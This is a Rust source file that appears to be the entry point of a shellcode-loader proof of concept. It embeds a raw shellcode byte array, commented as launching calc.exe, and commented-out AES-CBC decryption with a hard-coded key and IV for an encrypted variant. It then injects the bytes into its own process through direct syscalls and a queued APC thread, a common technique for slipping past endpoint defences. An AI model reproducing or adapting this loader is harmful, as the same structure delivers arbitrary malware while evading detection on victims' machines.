#![allow(asm_sub_register)]
use syscall::get_syscall_list;

mod ffi_ctypes;
mod inject;
mod syscall;

#[macro_use]
extern crate alloc;

fn main() {
    //let argv: Vec<String> = std::env::args().collect();

    //if argv.iter().filter(|s| s.as_str() == "run").count() < 1 {
    //    println!("Usage: ./project.exe run");
    //    return;
    //}

    // calc.exe.. if you trust me :)
    // https://gchq.github.io/CyberChef/#recipe=AES_Encrypt(%7B'option':'UTF8','string':'MySecuredKey123%2B'%7D,%7B'option':'Hex','string':'000102030405060708090A0B0C0D0E0F'%7D,'CBC','Raw','Hex',%7B'option':'Hex','string':''%7D)
    //let shellcode = b"\x14\xef\xb2\xba\x46\x35\x5a\x7b\xa1\xc5\x6a\x85\xbd\xc4\x04\x99\xc9\xb0\x07\xdb\x7b\x19\xf8\x1d\xaf\xc7\x9e\x3a\xff\x45\x31\xb0\xda\x8d\x93\x68\xa7\xcd\x79\x65\xd5\xb7\xc0\x35\x92\xaa\x6c\x20\xa9\x8c\x8f\xf9\x61\xa4\x79\xf5\xce\xff\xcd\x3b\xc5\x50\xbb\x38\xc3\x8c\xfe\x37\x20\x94\x32\x1d\x7c\x6d\x34\x95\x54\xb8\x94\x2d\x1f\x8b\xd7\x3f\x9c\xe9\xac\x11\x4e\x5b\xe7\xeb\xba\x0a\xd9\x8c\x75\x25\xc4\x62\x26\x56\x29\x5a\xd8\x63\xbc\x6b\x11\x37\xfa\xdc\xa6\x67\x81\xa9\x67\xf5\xeb\xa7\x4c\x88\x64\xc2\x92\x2e\xdc\x2f";
    //let key = b"MySecuredKey123+";
    //let iv = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F";
    //let cipher = libaes::Cipher::new_128(&key);
    //let decrypted = cipher.cbc_decrypt(iv, &shellcode[..]);
    let decrypted = [
        0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15,
        0x51, 0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b,
        0x7e, 0x18, 0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29, 0xd4, 0x65, 0x48, 0x8b, 0x32,
        0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b,
        0x7e, 0x30, 0x03, 0x57, 0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x01,
        0xfe, 0x8b, 0x54, 0x1f, 0x24, 0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad, 0x81, 0x3c,
        0x07, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe, 0x8b,
        0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff, 0xd7,
    ];
    unsafe {
        let syscall_list = get_syscall_list().expect("Dll not found in memory");
        inject::self_inject_queue_apc_thread(&syscall_list, &decrypted);
    }
}
